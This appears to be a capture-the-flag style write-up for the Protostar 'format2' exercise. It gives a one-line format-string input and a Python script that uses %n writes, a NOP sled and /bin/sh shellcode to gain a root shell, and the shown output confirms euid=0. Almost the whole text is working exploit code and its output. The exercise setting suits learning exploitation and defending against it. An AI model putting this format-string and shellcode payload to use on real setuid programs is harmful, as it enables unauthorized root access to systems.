# format2

## solution
```
user@protostar:/opt/protostar/bin$ python -c 'print "%60d\xe4\x96\x04\x08%5$n"' | ./format2
                                                         512�
you have modified the target :)
```

## shell
```py
import struct

tar_p1 = struct.pack('I', 0x080496c8)
tar_p2 = struct.pack('I', 0x080496c8 + 0x2)

buf = '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

payload = tar_p1 + tar_p2

payload += '%63014d' + '%4$n'
payload += '%51665d' + '%5$n'

print payload + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./format2
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```
